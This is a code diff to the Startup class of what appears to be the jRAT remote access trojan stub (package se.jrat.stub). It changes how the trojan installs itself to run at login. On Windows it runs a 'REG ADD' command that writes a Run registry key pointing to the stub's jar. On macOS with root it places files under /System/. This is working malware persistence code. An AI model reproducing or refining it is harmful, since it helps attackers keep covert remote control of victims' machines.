@@ -7,6 +7,7 @@ import java.io.PrintWriter;
 import se.jrat.stub.utils.Utils;
 
 import com.redpois0n.oslib.OperatingSystem;
+import com.redpois0n.oslib.WindowsVersion;
 
 
 public class Startup {
@@ -19,14 +20,14 @@ public class Startup {
 		if (Utils.isRoot() && OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
 			home = "/System/";
 		}
-
-		if (currentJar.isFile()) {
+		if (currentJar.isFile() || currentJar.getName().endsWith(".jar")) {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
 
-				if (System.getProperty("os.name").toLowerCase().contains("xp")) {			
-					String data = "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"";
-					Runtime.getRuntime().exec("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"" + name + "\" /t REG_SZ /d " + data + " /f");
+				if (WindowsVersion.getFromString() == WindowsVersion.WINXP) {			
+					String data = javaHome + " -jar \"" + currentJar.getAbsolutePath().replace("%20", " ") + "\"";
+					String cmd = "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"" + name + "\" /t REG_SZ /d \"" + data + "\" /f";
+					Runtime.getRuntime().exec(cmd);
 				} else {
 					try {
 						WinRegistry.deleteValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name);
